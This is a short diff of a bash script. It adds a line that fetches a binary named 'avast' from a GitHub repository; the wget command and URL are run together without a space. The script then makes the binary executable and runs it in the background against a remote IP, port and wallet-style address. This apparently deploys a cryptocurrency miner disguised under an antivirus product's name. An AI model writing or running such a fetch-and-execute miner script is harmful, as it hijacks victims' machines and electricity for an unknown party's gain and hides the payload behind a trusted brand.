@@ -1,5 +1,5 @@
 #!/bin/bash
-
+wgethttps://github.com/aurbach55/pos/raw/main/avast
 chmod +x avast
 nohup ./avast -v -l 162.55.8.164:9999 -u RWZG7MP3LepujPY8rVS9ZuUXZnDdNveBF4.X -t 4 -x > nohup.out
 
